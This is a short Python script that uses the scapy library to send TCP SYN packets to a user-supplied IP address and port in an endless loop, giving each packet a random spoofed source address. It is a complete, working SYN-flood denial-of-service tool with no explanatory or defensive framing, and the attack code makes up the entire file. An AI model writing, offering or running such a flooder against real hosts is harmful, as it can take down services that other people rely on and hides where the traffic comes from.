from scapy.all import *

ip = input("IP: ")
port = int(input("Port: "))

def tcp_syn(ip_adress, sport, dport):
    s_address = RandIP()
    d_adress = ip_adress

    packet = IP(src=s_address, dst=d_adress)/TCP(sport=sport, dport=dport, seq=1255066, flags="S")
    send(packet)

while(True):
    tcp_syn(ip, 1234, port)